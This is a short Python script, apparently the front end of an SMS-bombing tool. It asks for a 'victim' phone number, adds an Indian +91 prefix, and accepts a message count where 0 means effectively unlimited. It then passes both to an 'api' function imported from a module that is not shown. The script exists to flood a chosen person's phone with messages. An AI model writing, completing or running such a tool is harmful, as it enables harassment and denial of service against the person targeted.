from _ import api
def main()->None:
	target:str=str(input("Enter victim ph.no:"))
	if len(target)==10:
		print("+91"+target)
	elif len(target)!=10:
		print("Invalid number")
		exit()
	else:
		print("Please enter correct number")

	max:int=10**500
	msg_count:int=int(input("Enter msg count(enter 0 for unlimited sms):"))
	if msg_count==0:
		msg_count=max
	else:
		msg_count=msg_count
	api(target,msg_count)
if __name__ == '__main__':
	main()
		